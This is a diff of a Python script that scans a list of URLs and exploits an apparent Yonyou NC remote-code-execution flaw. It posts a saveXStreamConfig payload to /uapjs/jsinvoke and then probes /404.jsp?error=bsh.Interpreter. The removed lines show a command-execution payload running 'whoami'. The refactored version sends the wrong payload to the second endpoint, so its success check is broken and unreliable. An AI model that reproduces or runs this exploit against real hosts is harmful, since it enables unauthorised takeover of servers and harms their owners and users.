@@ -1,7 +1,7 @@
 import argparse
-from time import time
-
 import requests
+from time import time
+from urllib.parse import urljoin
 
 print('''
  _    _____                                     
@@ -12,6 +12,20 @@ print('''
                   |___/                   |___/ 
 脚本，启动！！！！
 ''')
+
+def make_request(session, target, path, payload):
+    url = urljoin(target, path)
+    try:
+        response = session.get(url, timeout=5, verify=False)
+        if response.status_code == 200:
+            response_1 = session.post(url, json=payload, timeout=5)
+            if response_1.status_code in [200, 404]:
+                response_2 = session.post(urljoin(target, "/404.jsp?error=bsh.Interpreter"), data=payload, timeout=5)
+                if "出错" not in response_2.text:
+                    return True
+    except requests.RequestException as e:
+        print(f"Error occurred while processing {url}: {e}")
+    return False
 
 parser = argparse.ArgumentParser()
 parser.add_argument('-f', type=str, default=None, required=False,
@@ -32,10 +46,7 @@ else:
     parser.print_help()
     exit()
 
-path_1 = "/uapjs/jsinvoke?action=invoke"
-path_2 = "/404.jsp?error=bsh.Interpreter"
-
-payload_1 = {
+payload = {
     "serviceName": "nc.itf.iufo.IBaseSPService",
     "methodName": "saveXStreamConfig",
     "parameterTypes": [
@@ -48,30 +59,14 @@ payload_1 = {
     ]
 }
 
-payload_2 = {
-    'cmd': 'org.apache.commons.io.IOUtils.toString(Runtime.getRuntime().exec("whoami").getInputStream())',
-}
-
 success_targets = []
 print("[+]任务开始.....")
 start = time()
 
-for url in urls:
-    target = url
-    allow_url = []
-    try:
-        response = requests.get(url=target, timeout=3, verify=False)
-        if response.status_code == 200:
-            response_1 = requests.post(url=f"{target}{path_1}", json=payload_1, timeout=3)
-        if response_1.status_code in [200, 404]:
-            print(f"{target}{path_2}")
-            response_2 = requests.post(url=f"{target}{path_2}", data=payload_2, timeout=3)
-            if "出错" in response_2.text:
-                pass
-            else:
-                success_targets.append(url)
-    except Exception as e:
-        continue
+with requests.Session() as session:
+    for url in urls:
+        if make_request(session, url, "/uapjs/jsinvoke?action=invoke", payload):
+            success_targets.append(url)
 
 end = time()
 print('任务完成,用时%ds.' % (end - start))
